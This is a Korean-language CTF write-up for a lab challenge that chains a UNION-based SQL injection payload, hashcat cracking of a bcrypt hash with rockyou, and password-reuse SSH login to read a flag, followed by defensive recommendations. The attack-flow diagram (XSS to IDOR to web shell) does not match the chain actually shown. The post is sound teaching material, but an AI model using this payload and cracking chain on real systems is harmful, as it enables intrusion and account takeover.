+++
title = "VulnABLE CTF [LUXORA] Write-up: Multi-Stage Attack 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Multi-Stage", "Silver", "Attack Chain", "SQLi", "Hash Cracking", "SSH", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Multi-Stage Attack 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Advanced Layer (Multi-Stage Attack)
- **난이도**: 🥈 Silver
- **타겟 경로**: 외부 로그인 페이지 및 SSH 포트
- **목표**: 1) **SQL Injection**으로 데이터베이스에 저장된 관리자의 비밀번호 해시(Hash)를 추출하고, 2) 추출한 해시를 **Offline Cracking (Hashcat)** 으로 해독한 뒤, 3) 획득한 평문 비밀번호를 이용해 관리자의 **SSH 서비스**에 로그인하여 로컬 서버를 장악하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 취약점 맵핑 (Reconnaissance)

이전 모듈에서 수행했던 각 공격 단위들을 종합적인 시나리오로 연결합니다.

**[공격 마스터플랜]**
* **Stage 1**: `/sqli/silver` 페이지의 검색창을 이용한 SQL Injection (UNION 기반)으로 `users` 테이블의 비밀번호 해시를 탈취한다.
* **Stage 2**: 탈취한 암호화된 해시를 해커의 로컬 컴퓨터에서 `hashcat`이나 `john the ripper`를 이용해 평문으로 크래킹(Cracking)한다.
* **Stage 3**: 탈취한 아이디와 평문 비밀번호를 들고 서버의 22번 포트(SSH)에 접속하여 운영체제 쉘(Shell)을 획득한다.

---

## 💥 2. 공격 체인 실행 (Exploitation Chain)

### 📊 공격 흐름도 (Attack Flow)

```text
[ XSS ] --(Steal Cookie)--> [ IDOR ] --(Find Admin Panel)--> [ File Upload ] --(Web Shell)--> [ RCE ]
```


### 💡 Stage 1: SQL Injection (데이터 유출)
이전에 파악했던 타겟 API(`/api/search?q=`)에 UNION 기반의 페이로드를 던져 데이터베이스 내의 회원 정보를 덤프(Dump) 뜹니다.

**[주입할 SQL 페이로드]**
```sql
' UNION SELECT username, password_hash, role FROM users --
```

**[API 응답 결과 중 일부]**
```json
{
  "id": 1,
  "name": "system_admin",
  "desc": "$2y$10$7R9J5l8H5a9v0T2N1Q8M6O4p3L5k9X2b4C6z8V0m2N1b3V5C7x9Z." 
}
```
관리자(`system_admin`)의 비밀번호 해시값을 획득했습니다. 해시 형식을 보니 `$2y$10$` 로 시작하는 전형적인 **Bcrypt** 알고리즘입니다.

### 💡 Stage 2: Hash Cracking (비밀번호 복구)
Bcrypt는 웹 공격(온라인)으로는 뚫기 어렵습니다. 따라서 해커의 강력한 GPU를 이용해 로컬에서 단어장(Wordlist)을 대입하는 오프라인 크래킹을 수행합니다.

해시값을 `hash.txt` 에 저장하고, `rockyou.txt` 단어장을 이용해 `hashcat` 을 돌립니다.

```bash
# Hashcat 모드 3200 (Bcrypt), -a 0 (사전 공격)
$ hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**[크래킹 결과]**
```text
$2y$10$7R9J5l8H5a9v... : superadmin2023!
```
몇 분의 연산 끝에, 관리자의 실제 비밀번호가 **`superadmin2023!`** 임을 알아냈습니다!

### 💡 Stage 3: SSH 접속 (Password Reuse 악용)
관리자가 웹 애플리케이션의 비밀번호와 서버(OS) 접속용 SSH 비밀번호를 동일하게 사용하는 **비밀번호 재사용(Password Reuse)** 취약점을 노려봅니다.

```bash
$ ssh system_admin@localhost -p 22
system_admin@localhost's password: [superadmin2023! 입력]
```

---

## 🚀 3. 최종 장악 및 결과 확인

비밀번호를 입력하고 엔터를 누릅니다.

### 🔍 서버의 응답
```text
Welcome to Ubuntu 22.04.2 LTS
Last login: Wed Nov  1 10:00:00 2023 from 10.0.0.1

system_admin@luxora-prod-server:~$
```

성공적으로 SSH 쉘을 획득했습니다! 이로써 단순히 웹사이트를 해킹한 것을 넘어, 타겟 서버의 인프라 자체를 장악했습니다.

플래그를 읽습니다.
```bash
system_admin@luxora-prod-server:~$ cat /home/system_admin/flag_multistage_silver.txt
FLAG{MULTISTAGE_🥈_SQLI_TO_SSH_CHAIN_D4E5F6}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

웹의 취약점(SQLi)으로 시작된 아주 작은 정보의 유출이, 오프라인 연산 파워(Hashcat)와 관리자의 나쁜 습관(Password Reuse)을 만나 서버의 Root 권한까지 도달하는 전형적인 APT(Advanced Persistent Threat) 킬 체인(Kill Chain)을 보여주었습니다.

**🔥 획득한 플래그:**
`FLAG{MULTISTAGE_🥈_SQLI_TO_SSH_CHAIN_D4E5F6}`

### 🛡️ 취약점 원인 및 방어 철학 (Defense in Depth)

1. **SQL Injection 방어**: 당연히 SQL 인젝션을 막기 위해 Prepared Statement를 사용해야 합니다. (Stage 1 차단)
2. **비밀번호 정책 강화 (Password Policy)**: 
   * `superadmin2023!` 같은 유추하기 쉬운(사전 파일에 있는) 비밀번호를 사용하지 못하도록, 사용자 가입 시 비밀번호 복잡도(Complexity) 검사를 강제해야 합니다. 
   * 또한 아무리 해시 알고리즘(Bcrypt)이 좋아도 원본 비밀번호가 단순하면 크래킹됩니다.
3. **Password Reuse 금지 및 MFA 적용 (Zero Trust)**: 
   * 웹 애플리케이션 접속 계정과 서버 OS(SSH) 접속 계정을 철저히 분리해야 합니다.
   * 외부 인터넷에서 22번 포트(SSH)로 접근하는 것을 방화벽(Security Group)으로 막아야 합니다.
   * SSH 접속 시 비밀번호 기반 인증을 비활성화하고, 오직 **공개키 인증(Public Key Authentication)** 만 허용해야 합니다. (Stage 3 완전 차단)